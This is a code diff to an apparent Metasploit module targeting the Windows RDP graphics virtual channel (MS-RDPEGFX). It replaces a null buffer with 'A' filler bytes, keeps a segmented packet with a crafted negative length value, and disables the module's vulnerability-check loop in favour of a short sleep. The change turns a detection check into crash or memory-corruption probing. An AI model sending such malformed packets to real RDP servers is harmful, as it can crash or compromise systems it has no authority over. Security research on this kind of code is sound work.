@@ -118,7 +118,7 @@ class MetasploitModule < Msf::Auxiliary
     resp = rdp_send(rdp_build_pkt(payload, 'drdynvc'))
 
     # see [MS-RDPEGFX] section 2.2.5
-    rdp8_bulk_encoded_data = "\x04" + ("\x00" * 0x200)
+    rdp8_bulk_encoded_data = "\x04" + ("\x41" * 0x200)
     rdp_data_segment = [0x200].pack("L<") + rdp8_bulk_encoded_data
     rdp_segmented_data = [0xe1, 1, 1 - 0x2000].pack("CS<l<") + rdp_data_segment
     print_status('=== Sending second packet ===')
@@ -129,10 +129,10 @@ class MetasploitModule < Msf::Auxiliary
     #print_status("+++ Resp length: #{resp.length}")
 
     print_status('Entering the dispatch loop')
-    rdp_dispatch_loop
-    return Exploit::CheckCode::Vulnerable if @found
+    #rdp_dispatch_loop
+    #return Exploit::CheckCode::Vulnerable if @found
 
-    # sleep(30) # need to keep the socket open
+    sleep(5) # need to keep the socket open
   end
 
   def rdp_on_channel_receive(pkt, chan_user_id, chan_id, flags, data)
